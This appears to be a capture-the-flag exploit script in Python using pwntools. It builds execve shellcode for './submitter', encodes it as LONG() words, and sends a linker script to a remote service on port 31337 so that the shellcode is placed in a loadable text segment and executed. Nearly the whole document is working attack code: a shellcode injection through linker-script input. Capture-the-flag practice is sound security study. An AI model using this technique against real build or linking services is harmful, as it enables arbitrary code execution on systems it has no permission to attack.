#!/usr/bin/env python3
from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]
uu64 = lambda x: u64(x.ljust(8,b'\0')[:8])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# exe = context.binary = ELF('./handout/challenge')

context.arch = 'amd64'
bin = './submitter'
payload = asm(shellcraft.execve(bin, [bin], []))
for x in split(payload, 4):
    print(f'LONG({hex(uu64(x))})')

io = remote(HOST, PORT)

lines = '''
SECTIONS {
	.text : {
        LONG(0x73647568)
        LONG(0x24348101)
        LONG(0x1010101)
        LONG(0x2f2eb848)
        LONG(0x6d627573)
        LONG(0x48507469)
        LONG(0x7568e789)
        LONG(0x81017364)
        LONG(0x1012434)
        LONG(0xb8480101)
        LONG(0x75732f2e)
        LONG(0x74696d62)
        LONG(0x56f63150)
        LONG(0x485e086a)
        LONG(0x4856e601)
        LONG(0x16ae689)
        LONG(0x31240cfe)
        LONG(0x894852d2)
        LONG(0x583b6ae2)
        LONG(0x50f)
	} : text
}
PHDRS {
	text PT_LOAD ;
}
'''


for line in lines.split('\n'):
    if line:
        io.sendline(line.encode())
io.sendline()

print(io.clean(1))
